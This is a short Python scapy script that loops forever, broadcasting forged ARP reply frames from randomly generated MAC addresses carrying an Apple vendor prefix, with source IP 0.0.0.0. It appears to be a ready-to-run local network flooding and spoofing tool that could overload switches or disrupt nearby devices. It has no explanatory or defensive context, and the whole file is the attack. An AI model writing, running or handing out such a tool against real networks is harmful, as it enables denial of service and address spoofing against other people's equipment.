from scapy.all import *

apple_vendor = "b8:e8:56:"
dest_mac = "FF:FF:FF:FF:FF:FF"

while 1:
	rand_mac = apple_vendor + ':'.join(RandMAC().split(':')[3:])
	print(rand_mac)
	sendp(Ether(src=rand_mac, dst=dest_mac)/
	ARP(op=2, psrc="0.0.0.0", hwdst=dest_mac)/Padding(load="X"*18), verbose=False)